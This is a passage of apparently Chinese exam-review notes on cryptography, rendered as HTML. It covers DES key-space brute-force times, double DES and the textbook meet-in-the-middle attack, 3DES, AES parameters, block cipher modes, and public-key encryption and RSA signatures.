+<td style="text-align:center">56</td>
+<td style="text-align:center">DES</td>
+<td style="text-align:center">2^56^  ≈  7.2 × 10^16^</td>
+<td style="text-align:center">2^55^  ns = 1.125 years</td>
+<td style="text-align:center">1  hour</td>
+</tr>
+<tr>
+<td style="text-align:center">128</td>
+<td style="text-align:center">AES</td>
+<td style="text-align:center">2^128^ ≈ 3.4  ×  10^38 ^</td>
+<td style="text-align:center">2^127^ ns = 5.3 ×  10^21^  years</td>
+<td style="text-align:center">5.3 ×  10^17^ years</td>
+</tr>
+<tr>
+<td style="text-align:center">168</td>
+<td style="text-align:center">Triple  DES</td>
+<td style="text-align:center">2^168^ ≈  3.7  ×  10^50^</td>
+<td style="text-align:center">2^167^ ns = 5.8 ×  10^33^ years</td>
+<td style="text-align:center">5.8 × 10^29^  years</td>
+</tr>
+<tr>
+<td style="text-align:center">192</td>
+<td style="text-align:center">AES</td>
+<td style="text-align:center">2^192^ ≈  6.3  ×  10^57^</td>
+<td style="text-align:center">2^191^ ns = 9.8 ×  10^40^  years</td>
+<td style="text-align:center">9.8 ×  10^36^  years</td>
+</tr>
+<tr>
+<td style="text-align:center">256</td>
+<td style="text-align:center">AES</td>
+<td style="text-align:center">2^256^≈  1.2  ×  10^77^</td>
+<td style="text-align:center">2^255^ ns = 1.8 ×  1060  years</td>
+<td style="text-align:center">1.8 × 10^56^  years</td>
+</tr>
+<tr>
+<td style="text-align:center">26 characters (permutation)</td>
+<td style="text-align:center">Monoalphabetic</td>
+<td style="text-align:center">2! = 4 ×  10^26^</td>
+<td style="text-align:center">2 × 10^26^ ns  = 6.3 ×  10^9^ years</td>
+<td style="text-align:center">6.3 ×  10^6^ years</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌三重DES及密钥使用、以及双重DES（中间相遇攻击）和三重DES（已知明文攻击）可能面临的攻击形式</li>
+</ul>
+</blockquote>
+<h4 id="双重des" class="headerLink">
+    <a href="#%e5%8f%8c%e9%87%8ddes" class="header-mark"></a>✨双重DES</h4><p>多次加密的最简单形式是进行两次加密，使用两个密钥。给定明文P以及密钥K~1~，K~2~密文C按照下述方式生成：
+$$
+C=E(K_2,E(K_1,P))
+$$
+解密时逆序使用这两个密钥
+$$
+P=D(K_1,D(K_2,C))
+$$
+DES加密是64位分组之间的映射，实际上映射可以看成一个置换，这就是说，对2^64^个可能的明文分组，DES用特定的密钥加密后都唯一对应一个64位的密文分组，否则即是两个输入块映射为一个输入块，则解密已恢复原始的明文就不可能了。那么，2^64^个可能的输入，一对一映射的数量是：
+$$
+(2^{64})! =10^{347,380,000,000,000,000,000}&gt;(10^{10^{20}})
+$$
+另一方面，DES为每个密钥定义了一个映射，映射总数是
+$$
+2^{56}&lt;10^{17}
+$$
+<figure><a class="lightgallery" href="/posts/cyber_security/1704513446307.png" title="1704513446307" data-thumbnail="/posts/cyber_security/1704513446307.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704513446307.png"
+            srcset="/posts/cyber_security/1704513446307.png, /posts/cyber_security/1704513446307.png 1.5x, /posts/cyber_security/1704513446307.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704513446307.png" height="354"  width="631" >
+    </a></figure></p>
+<h4 id="中间相遇攻击" class="headerLink">
+    <a href="#%e4%b8%ad%e9%97%b4%e7%9b%b8%e9%81%87%e6%94%bb%e5%87%bb" class="header-mark"></a>中间相遇攻击</h4><p>双重DES对应的映射与单DES对应的映射不同，但是还有另外一种攻击方法，<strong>这种方法不依赖于DES的如何特殊性质，对所有分组密码都有效。</strong></p>
+<p>==中间相遇攻击==</p>
+<p>假设有：
+$$
+C=E(K_2,E(K_1,P))
+$$
+则有：
+$$
+X=E(K_1,P)=D(K_2,C)
+$$
+攻击步骤：</p>
+<blockquote>
+<p>给定明密文对<code>(P,C)</code></p>
+<ol>
+<li>P按所有可能的密钥K~1~加密，得到2^56^个结果</li>
+<li>将结果按X的值排序在一个表内</li>
+<li>将C用所有的可能的密钥K~2~解密，每解密一次就将解密结果与表中的值比较</li>
+<li>如果有相等的就用刚才密钥对对一个新的明密文对进行验证</li>
+<li>如果两个密钥产生了正确的密文，就认定这两个密钥是正确的密钥</li>
+</ol>
+</blockquote>
+<p>对任意明文P，双重DES后可能得到2^64^个密文中的一个，双重DES使用了112位密钥，密钥空间是2^112^，因此，对明文P可以产生密文C的密钥个数平均为2^112^/2^64^=2^48^。</p>
+<p>故上述攻击对第一个<code>(P, C)</code>将产生2^48^个错误的结果，而对第二个64位<code>(P, C)</code>，错误结果的概率就降为2^48-64^=2^-16^。即中间相遇攻击使用两组已知明密文对<code>(P, C)</code>就可以猜出正确密钥的概率为1-2^-16^。</p>
+<p>结论：<strong>已知明文攻击可以成功对付密钥长度为112位的双重DES。其付出是2^56^数量级的，比攻击单DES所需的2^55^数量级多不了多少。</strong></p>
+<h4 id="3des三重destdea" class="headerLink">
+    <a href="#3des%e4%b8%89%e9%87%8ddestdea" class="header-mark"></a>✨3DES——三重DES(TDEA)</h4><ul>
+<li>使用3个密钥，168bits</li>
+</ul>
+<p>$$
+C=E(K_3,D(K_2,E(K_1,P)))
+$$</p>
+<p>与单DES兼容：取K~3~=K~2~或K~1~=K~2~</p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240103212401610.png" title="image-20240103212401610" data-thumbnail="/posts/cyber_security/image-20240103212401610.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240103212401610.png"
+            srcset="/posts/cyber_security/image-20240103212401610.png, /posts/cyber_security/image-20240103212401610.png 1.5x, /posts/cyber_security/image-20240103212401610.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240103212401610.png" height="336"  width="602" >
+    </a></figure></p>
+<h2 id="五有限域不在考试范围" class="headerLink">
+    <a href="#%e4%ba%94%e6%9c%89%e9%99%90%e5%9f%9f%e4%b8%8d%e5%9c%a8%e8%80%83%e8%af%95%e8%8c%83%e5%9b%b4" class="header-mark"></a>五、有限域（不在考试范围）</h2><h2 id="六高级加密标准aes128" class="headerLink">
+    <a href="#%e5%85%ad%e9%ab%98%e7%ba%a7%e5%8a%a0%e5%af%86%e6%a0%87%e5%87%86aes128" class="header-mark"></a>六、高级加密标准AES——128</h2><h3 id="从3des到高级数据加密标准aes" class="headerLink">
+    <a href="#%e4%bb%8e3des%e5%88%b0%e9%ab%98%e7%ba%a7%e6%95%b0%e6%8d%ae%e5%8a%a0%e5%af%86%e6%a0%87%e5%87%86aes" class="header-mark"></a>从3DES到高级数据加密标准AES</h3><ul>
+<li>
+<p>3DES(FIPS 46-3)</p>
+<ul>
+<li>优点：能继续使用原有的DES软硬件模块，保护了投资；</li>
+<li>缺点：速度慢，而且64位分组显得太小。</li>
+</ul>
+</li>
+<li>
+<p>AES是重新遴选和设计的代替DES/3DES的下一代对称算法推荐标准。</p>
+</li>
+<li>
+<p>DES/AES之外还有其他很多对称算法可用，也包括流密码等，如Blowfish、RC5、 RC6、IDEA、CAST-128</p>
+</li>
+</ul>
+<blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌AES密码算法的基本参数（明密文分组长度，密钥长度，见书上表6.1） 及每轮中的基本操作（不在考试范围）</li>
+</ul>
+</blockquote>
+<h3 id="高级加密标准aes准则" class="headerLink">
+    <a href="#%e9%ab%98%e7%ba%a7%e5%8a%a0%e5%af%86%e6%a0%87%e5%87%86aes%e5%87%86%e5%88%99" class="header-mark"></a>高级加密标准AES准则</h3><ul>
+<li>
+<p>AES Homepage</p>
+<ul>
+<li><a href="http://www.nist.gov/aes/" target="_blank" rel="noopener noreferrer">http://www.nist.gov/aes/</a></li>
+<li>FIPS 197<a href="http://csrc.nist.gov/CryptoToolkit/aes/" target="_blank" rel="noopener noreferrer">http://csrc.nist.gov/</a><a href="http://csrc.nist.gov/CryptoToolkit/aes/" target="_blank" rel="noopener noreferrer">CryptoToolkit</a><a href="http://csrc.nist.gov/CryptoToolkit/aes/" target="_blank" rel="noopener noreferrer">/</a><a href="http://csrc.nist.gov/CryptoToolkit/aes/" target="_blank" rel="noopener noreferrer">aes</a><a href="http://csrc.nist.gov/CryptoToolkit/aes/" target="_blank" rel="noopener noreferrer">/</a></li>
+</ul>
+</li>
+<li>
+<p>时间表</p>
+<ul>
+<li>1997年，要求算法公开、自由，密钥128＋</li>
+<li>1998/8/20，征集到15个候选算法</li>
+<li>1999/3,4，经分析开会讨论落实了5个算法</li>
+</ul>
+</li>
+<li>
+<p>MARS, RC6, Rijndael, Serpent, Twofish</p>
+<ul>
+<li>2000/10/2，选定Rijndael为AES</li>
+<li>2001/11，FIPS 197</li>
+</ul>
+</li>
+</ul>
+<h3 id="aes分组长度密钥长度" class="headerLink">
+    <a href="#aes%e5%88%86%e7%bb%84%e9%95%bf%e5%ba%a6%e5%af%86%e9%92%a5%e9%95%bf%e5%ba%a6" class="header-mark"></a>✨AES分组长度、密钥长度</h3><table>
+<thead>
+<tr>
+<th style="text-align:center"></th>
+<th style="text-align:center">Key</th>
+<th style="text-align:center">Block</th>
+<th style="text-align:center">Rounds</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">AES-128</td>
+<td style="text-align:center">128位</td>
+<td style="text-align:center">128位</td>
+<td style="text-align:center">10轮</td>
+</tr>
+<tr>
+<td style="text-align:center">AES-192</td>
+<td style="text-align:center">192位</td>
+<td style="text-align:center">128位</td>
+<td style="text-align:center">12轮</td>
+</tr>
+<tr>
+<td style="text-align:center">AES-256</td>
+<td style="text-align:center">256位</td>
+<td style="text-align:center">128位</td>
+<td style="text-align:center">14轮</td>
+</tr>
+</tbody>
+</table>
+<h3 id="表61" class="headerLink">
+    <a href="#%e8%a1%a861" class="header-mark"></a>✨表6.1</h3><p><figure><a class="lightgallery" href="/posts/cyber_security/1704289234439.png" title="1704289234439" data-thumbnail="/posts/cyber_security/1704289234439.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704289234439.png"
+            srcset="/posts/cyber_security/1704289234439.png, /posts/cyber_security/1704289234439.png 1.5x, /posts/cyber_security/1704289234439.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704289234439.png" height="442"  width="1945" >
+    </a></figure></p>
+<h3 id="aes每轮中的操作" class="headerLink">
+    <a href="#aes%e6%af%8f%e8%bd%ae%e4%b8%ad%e7%9a%84%e6%93%8d%e4%bd%9c" class="header-mark"></a>AES每轮中的操作</h3><ol>
+<li>
+<p>x→state（输入）</p>
+<p>AddRoundKey（轮密钥加）</p>
+</li>
+<li>
+<p>N~r-1~轮</p>
+<p>S: SubBytes（<strong>字节代换</strong>）</p>
+<p>P: ShiftRows（<strong>行移位</strong>）</p>
+<p>MixColumns（<strong>列混淆</strong>）</p>
+<p>AddRoundKey（<strong>轮密钥加</strong>）</p>
+</li>
+<li>
+<p>最后1轮</p>
+<p>S: SubBytes（字节代换）</p>
+<p>P: ShiftRows（行移位）</p>
+<p>AddRoundKey（轮密钥加）</p>
+</li>
+<li>
+<p>state→y（输出）</p>
+</li>
+</ol>
+<h4 id="以aes-128为例即128密钥" class="headerLink">
+    <a href="#%e4%bb%a5aes-128%e4%b8%ba%e4%be%8b%e5%8d%b3128%e5%af%86%e9%92%a5" class="header-mark"></a>以AES-128为例，即128密钥</h4><p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240103213403940.png" title="image-20240103213403940" data-thumbnail="/posts/cyber_security/image-20240103213403940.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240103213403940.png"
+            srcset="/posts/cyber_security/image-20240103213403940.png, /posts/cyber_security/image-20240103213403940.png 1.5x, /posts/cyber_security/image-20240103213403940.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240103213403940.png" height="1126"  width="1500" >
+    </a></figure></p>
+<h2 id="七分组加密的工作模式" class="headerLink">
+    <a href="#%e4%b8%83%e5%88%86%e7%bb%84%e5%8a%a0%e5%af%86%e7%9a%84%e5%b7%a5%e4%bd%9c%e6%a8%a1%e5%bc%8f" class="header-mark"></a>七、分组加密的工作模式</h2><blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌分组密码算法工作模式：ECB、CBC、CFB、OFB、CTR（详见ppt），全称与英文缩写，每种模式加解密特点（表7.1）</li>
+</ul>
+</blockquote>
+<h3 id="分组密码的工作模式表71" class="headerLink">
+    <a href="#%e5%88%86%e7%bb%84%e5%af%86%e7%a0%81%e7%9a%84%e5%b7%a5%e4%bd%9c%e6%a8%a1%e5%bc%8f%e8%a1%a871" class="header-mark"></a>分组密码的工作模式(表7.1)</h3><p><figure><a class="lightgallery" href="/posts/cyber_security/1704519153199.png" title="1704519153199" data-thumbnail="/posts/cyber_security/1704519153199.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704519153199.png"
+            srcset="/posts/cyber_security/1704519153199.png, /posts/cyber_security/1704519153199.png 1.5x, /posts/cyber_security/1704519153199.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704519153199.png" height="400"  width="1168" >
+    </a></figure></p>
+<h3 id="ecb电话本模式" class="headerLink">
+    <a href="#ecb%e7%94%b5%e8%af%9d%e6%9c%ac%e6%a8%a1%e5%bc%8f" class="header-mark"></a>✨ECB：电话本模式</h3><p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240103214910541.png" title="image-20240103214910541" data-thumbnail="/posts/cyber_security/image-20240103214910541.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240103214910541.png"
+            srcset="/posts/cyber_security/image-20240103214910541.png, /posts/cyber_security/image-20240103214910541.png 1.5x, /posts/cyber_security/image-20240103214910541.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240103214910541.png" height="617"  width="1037" >
+    </a></figure></p>
+<h3 id="cbc密文分组链接模式" class="headerLink">
+    <a href="#cbc%e5%af%86%e6%96%87%e5%88%86%e7%bb%84%e9%93%be%e6%8e%a5%e6%a8%a1%e5%bc%8f" class="header-mark"></a>✨CBC：密文分组链接模式</h3><p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240103214943643.png" title="image-20240103214943643" data-thumbnail="/posts/cyber_security/image-20240103214943643.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240103214943643.png"
+            srcset="/posts/cyber_security/image-20240103214943643.png, /posts/cyber_security/image-20240103214943643.png 1.5x, /posts/cyber_security/image-20240103214943643.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240103214943643.png" height="800"  width="1189" >
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240106133358097.png" title="image-20240106133358097" data-thumbnail="/posts/cyber_security/image-20240106133358097.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240106133358097.png"
+            srcset="/posts/cyber_security/image-20240106133358097.png, /posts/cyber_security/image-20240106133358097.png 1.5x, /posts/cyber_security/image-20240106133358097.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240106133358097.png" height="208"  width="1325" >
+    </a></figure></p>
+<h3 id="cfb密文反馈模式" class="headerLink">
+    <a href="#cfb%e5%af%86%e6%96%87%e5%8f%8d%e9%a6%88%e6%a8%a1%e5%bc%8f" class="header-mark"></a>✨CFB：密文反馈模式</h3><p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240106133453954.png" title="image-20240106133453954" data-thumbnail="/posts/cyber_security/image-20240106133453954.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240106133453954.png"
+            srcset="/posts/cyber_security/image-20240106133453954.png, /posts/cyber_security/image-20240106133453954.png 1.5x, /posts/cyber_security/image-20240106133453954.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240106133453954.png" height="816"  width="1173" >
+    </a></figure></p>
+<h3 id="ofb输出反馈模式" class="headerLink">
+    <a href="#ofb%e8%be%93%e5%87%ba%e5%8f%8d%e9%a6%88%e6%a8%a1%e5%bc%8f" class="header-mark"></a>✨OFB：输出反馈模式</h3><p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240106133518114.png" title="image-20240106133518114" data-thumbnail="/posts/cyber_security/image-20240106133518114.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240106133518114.png"
+            srcset="/posts/cyber_security/image-20240106133518114.png, /posts/cyber_security/image-20240106133518114.png 1.5x, /posts/cyber_security/image-20240106133518114.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240106133518114.png" height="895"  width="1050" >
+    </a></figure></p>
+<h3 id="ctr计数器模式" class="headerLink">
+    <a href="#ctr%e8%ae%a1%e6%95%b0%e5%99%a8%e6%a8%a1%e5%bc%8f" class="header-mark"></a>✨CTR：计数器模式</h3><p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240106133536306.png" title="image-20240106133536306" data-thumbnail="/posts/cyber_security/image-20240106133536306.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240106133536306.png"
+            srcset="/posts/cyber_security/image-20240106133536306.png, /posts/cyber_security/image-20240106133536306.png 1.5x, /posts/cyber_security/image-20240106133536306.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240106133536306.png" height="829"  width="1181" >
+    </a></figure></p>
+<h2 id="八伪随机数的产生和流密码" class="headerLink">
+    <a href="#%e5%85%ab%e4%bc%aa%e9%9a%8f%e6%9c%ba%e6%95%b0%e7%9a%84%e4%ba%a7%e7%94%9f%e5%92%8c%e6%b5%81%e5%af%86%e7%a0%81" class="header-mark"></a>八、伪随机数的产生和流密码</h2><p>12、随机数的产生和使用（ppt上没有，不在考试范围）</p>
+<p>13、流密码特点、RC4算法（算法参数：166页提到：面向字节运算的变长密钥流密码）</p>
+<h2 id="九公钥密码学与rsa" class="headerLink">
+    <a href="#%e4%b9%9d%e5%85%ac%e9%92%a5%e5%af%86%e7%a0%81%e5%ad%a6%e4%b8%8ersa" class="header-mark"></a>九、公钥密码学与RSA</h2><blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌公钥密码术语，见书上表9.1</li>
+</ul>
+</blockquote>
+<h3 id="公钥密码术语表91" class="headerLink">
+    <a href="#%e5%85%ac%e9%92%a5%e5%af%86%e7%a0%81%e6%9c%af%e8%af%ad%e8%a1%a891" class="header-mark"></a>公钥密码术语(表9.1)</h3><p><figure><a class="lightgallery" href="/posts/cyber_security/1704520755164.png" title="1704520755164" data-thumbnail="/posts/cyber_security/1704520755164.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704520755164.png"
+            srcset="/posts/cyber_security/1704520755164.png, /posts/cyber_security/1704520755164.png 1.5x, /posts/cyber_security/1704520755164.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704520755164.png" height="363"  width="1042" >
+    </a></figure></p>
+<h3 id="公钥密码体制图91a" class="headerLink">
+    <a href="#%e5%85%ac%e9%92%a5%e5%af%86%e7%a0%81%e4%bd%93%e5%88%b6%e5%9b%be91a" class="header-mark"></a>✨公钥密码体制(✨图9.1(a))</h3><ul>
+<li><strong>明文</strong>：算法的输入。它们是可读信息或数据</li>
+<li><strong>加密算法</strong>：加密算法对明文进行各种转换</li>
+<li><strong>公钥和私钥</strong>：算法的输入。这对密钥中一个用于加密，一个用于解密。加密算法执行的变换依赖于公钥或者私钥。</li>
+</ul>
+<h4 id="用公钥加密" class="headerLink">
+    <a href="#%e7%94%a8%e5%85%ac%e9%92%a5%e5%8a%a0%e5%af%86" class="header-mark"></a>用公钥加密</h4><p><figure><a class="lightgallery" href="/posts/cyber_security/1704519813974.png" title="1704519813974" data-thumbnail="/posts/cyber_security/1704519813974.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704519813974.png"
+            srcset="/posts/cyber_security/1704519813974.png, /posts/cyber_security/1704519813974.png 1.5x, /posts/cyber_security/1704519813974.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704519813974.png" height="607"  width="1072" >
+    </a></figure></p>
+<h4 id="用私钥加密" class="headerLink">
+    <a href="#%e7%94%a8%e7%a7%81%e9%92%a5%e5%8a%a0%e5%af%86" class="header-mark"></a>用私钥加密</h4><p><figure><a class="lightgallery" href="/posts/cyber_security/1704519826460.png" title="1704519826460" data-thumbnail="/posts/cyber_security/1704519826460.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704519826460.png"
+            srcset="/posts/cyber_security/1704519826460.png, /posts/cyber_security/1704519826460.png 1.5x, /posts/cyber_security/1704519826460.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704519826460.png" height="646"  width="1105" >
+    </a></figure></p>
+<ul>
+<li>
+<p><strong>密文</strong>：算法的输出。它依赖于明文和密文，对给定的消息，不同的密钥产生的密文不同。</p>
+</li>
+<li>
+<p><strong>解密算法</strong>：该算法接收密文和对应的密钥，并产生原始的明文</p>
+<p>其主要步骤：</p>
+<blockquote>
+<ol>
+<li>每一用户产生一对密钥，用来加密和解密消息。</li>
+<li>每一用户将其中一个密钥存于公开的寄存器或其他可访问的文件中，该密钥称为公钥，另一密钥是私有的（如图9.1(a）)所示，每一用户可以用于若干其他用户的公钥</li>
+<li>若Bob要发消息给Alice，则Bob用Alice的公钥对消息加密。</li>
+<li>Alice收到消息后，用其私钥对消息解密。由于只有Alice知道其自身的私钥，所以其他的接受者均不能解密出消息。</li>
+</ol>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌公钥密码体制的应用，主要指公钥的加解密、密钥分配/交换和数字签名等方法的应用/作用。见书上表9.3和ppt上</li>
+</ul>
+</blockquote>
+<h3 id="公钥密码体制的应用" class="headerLink">
+    <a href="#%e5%85%ac%e9%92%a5%e5%af%86%e7%a0%81%e4%bd%93%e5%88%b6%e7%9a%84%e5%ba%94%e7%94%a8" class="header-mark"></a>✨公钥密码体制的应用</h3><p>公钥密码体制的应用可分为三类：</p>
+<ul>
+<li><strong>加密/解密</strong>：发送方用接收方的公钥对消息加密。</li>
+<li><strong>数字签名</strong>：发送方用其私钥对消息“签名”。签名可以通过对整条消息加密或者对消息的一个小的数据块加密来产生，其中该小数据块是整条消息的函数。</li>
+<li><strong>密钥交换</strong>：通信双方交换会话密钥。有几种不同的方法可用于密钥交换，这些方法都是使用了通信一方或双方的私钥。</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/1704524683297.png" title="1704524683297" data-thumbnail="/posts/cyber_security/1704524683297.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704524683297.png"
+            srcset="/posts/cyber_security/1704524683297.png, /posts/cyber_security/1704524683297.png 1.5x, /posts/cyber_security/1704524683297.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704524683297.png" height="313"  width="1402" >
+    </a></figure></p>
+<p>公钥密码体制中的两个密钥任何一个都可以用来加密，而另一个用来解密，这样就可以利用公钥密码实现其他一些功能，如图9.2所示的方法可以提供保密性，图9.1(b)和图9.3说明公钥密码可以用于认证。</p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/1704521689207.png" title="1704521689207" data-thumbnail="/posts/cyber_security/1704521689207.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704521689207.png"
+            srcset="/posts/cyber_security/1704521689207.png, /posts/cyber_security/1704521689207.png 1.5x, /posts/cyber_security/1704521689207.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704521689207.png" height="550"  width="961" >
+    </a></figure></p>
+<h4 id="公钥算法用于认证" class="headerLink">
+    <a href="#%e5%85%ac%e9%92%a5%e7%ae%97%e6%b3%95%e7%94%a8%e4%ba%8e%e8%ae%a4%e8%af%81" class="header-mark"></a>公钥算法用于认证</h4><ul>
+<li>
+<p>如果你(Bob)已经公布自己的公钥<code>Ke</code>，则他人可认证/鉴别你发出的消息（及你的身份）</p>
+</li>
+<li>
+<p>对于消息<code>P</code>，使用你的私钥</p>
+<p><code>C = E（P，Kd）</code></p>
+</li>
+<li>
+<p>他人可把密文<code>C</code>用你的公钥解密</p>
+<p><code>D（C，Ke）＝P</code></p>
+</li>
+<li>
+<p>可以确信<code>P</code>必然是由你加密成<code>C</code>的，因为加密需要的私钥只有你有。</p>
+</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/1704522217177.png" title="1704522217177" data-thumbnail="/posts/cyber_security/1704522217177.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704522217177.png"
+            srcset="/posts/cyber_security/1704522217177.png, /posts/cyber_security/1704522217177.png 1.5x, /posts/cyber_security/1704522217177.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704522217177.png" height="580"  width="889" >
+    </a></figure></p>
+<p>A向B发送消息前，先用A的私钥对消息进行加密，B则用A的公钥对消息进行解密。</p>
+<p>由于消息只可能由A的私钥加密而来，因此，<strong>整个加密后的消息就是数字签名</strong>。</p>
+<p>此外，因为只有拥有A的私钥才能产生上述加密后的消息，<strong>因此该消息可用于认证源和数据完整性</strong>。</p>
+<h4 id="消息来源认证和数字签名" class="headerLink">
+    <a href="#%e6%b6%88%e6%81%af%e6%9d%a5%e6%ba%90%e8%ae%a4%e8%af%81%e5%92%8c%e6%95%b0%e5%ad%97%e7%ad%be%e5%90%8d" class="header-mark"></a>消息来源认证和数字签名</h4><h5 id="消息来源认证" class="headerLink">
+    <a href="#%e6%b6%88%e6%81%af%e6%9d%a5%e6%ba%90%e8%ae%a4%e8%af%81" class="header-mark"></a>消息来源认证</h5><ul>
+<li>
+<p><strong>假设使用加解密操作对称的算法如RSA</strong></p>
+</li>
+<li>
+<p>对消息<code>H</code>签名：</p>
+<p><code>S = Sig（H，Kd）</code></p>
+</li>
+<li>
+<p>验证</p>
+<p><code>Ver（C，Ke）＝？ H</code></p>
+</li>
+<li>
+<p>消息<code>H</code>必然是<code>Kd</code>的持有人签署的</p>
+</li>
+</ul>
+<h5 id="认证保密" class="headerLink">
+    <a href="#%e8%ae%a4%e8%af%81%e4%bf%9d%e5%af%86" class="header-mark"></a>认证保密</h5><p>上述介绍的认证，考虑到所有人都可以获得A的公钥从而解密A的消息，所以其实消息的保密性并没有得到保证，假若需要保证<code>认证+保密</code>，可以两次使用公钥方法：</p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/1704523523945.png" title="1704523523945" data-thumbnail="/posts/cyber_security/1704523523945.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704523523945.png"
+            srcset="/posts/cyber_security/1704523523945.png, /posts/cyber_security/1704523523945.png 1.5x, /posts/cyber_security/1704523523945.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704523523945.png" height="550"  width="865" >
+    </a></figure></p>
+<h5 id="签名的具体实现" class="headerLink">
+    <a href="#%e7%ad%be%e5%90%8d%e7%9a%84%e5%85%b7%e4%bd%93%e5%ae%9e%e7%8e%b0" class="header-mark"></a>签名的具体实现</h5><ul>
+<li>
+<p>有消息要发给对方，要署名且保密传递</p>
+</li>
+<li>
+<p>发送方：先用自己的私钥签名</p>
+</li>
+<li>
+<p>发送方：再用对方的公钥加密</p>
+</li>
+<li>
+<p>发送消息，消息达到接收方</p>
+</li>
+<li>
+<p>接收方：先用自己的私钥解密</p>
+</li>
+<li>
+<p>接收方：再用对方的公钥验证签名是否有效</p>
+</li>
+</ul>
+<h3 id="公钥密码的特点" class="headerLink">
+    <a href="#%e5%85%ac%e9%92%a5%e5%af%86%e7%a0%81%e7%9a%84%e7%89%b9%e7%82%b9" class="header-mark"></a>✨公钥密码的特点</h3><blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌与对称密码对比，公钥密码的特点，见书上的表9.2</li>
+</ul>
+</blockquote>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/1704521527004.png" title="1704521527004" data-thumbnail="/posts/cyber_security/1704521527004.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704521527004.png"
+            srcset="/posts/cyber_security/1704521527004.png, /posts/cyber_security/1704521527004.png 1.5x, /posts/cyber_security/1704521527004.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704521527004.png" height="361"  width="1273" >
+    </a></figure></p>
+<h3 id="公钥算法安全性的数学基础" class="headerLink">
+    <a href="#%e5%85%ac%e9%92%a5%e7%ae%97%e6%b3%95%e5%ae%89%e5%85%a8%e6%80%a7%e7%9a%84%e6%95%b0%e5%ad%a6%e5%9f%ba%e7%a1%80" class="header-mark"></a>公钥算法安全性的数学基础</h3><blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌公钥算法安全性的数学基础有哪些？大整数分解及离散对数问题的难解性</li>
+</ul>
+</blockquote>
+<p>转上<a href="#%e4%ba%8c%e3%80%81%e6%95%b0%e8%ae%ba%e5%9f%ba%e7%a1%80%ef%bc%88%e4%b8%8d%e5%9c%a8%e8%80%83%e8%af%95%e8%8c%83%e5%9b%b4%ef%bc%89" rel="">数论部分</a></p>
+<h4 id="模幂运算-1" class="headerLink">
+    <a href="#%e6%a8%a1%e5%b9%82%e8%bf%90%e7%ae%97-1" class="header-mark"></a>✨模幂运算</h4><blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌理解模幂运算，包括: C=M^e^ mod n, 则M=C^d^ mod n；掌握RSA算法的计算（必考）</li>
+</ul>
+</blockquote>
+<ul>
+<li>
+<p><code>（a×b） mod n ＝ (a mod n×b mod n) mod n</code></p>
+<p>幂运算：求11^7^ mod 13=?</p>
+<blockquote>
+<p>11^2^ = 121 ≡ 4 mod 13</p>
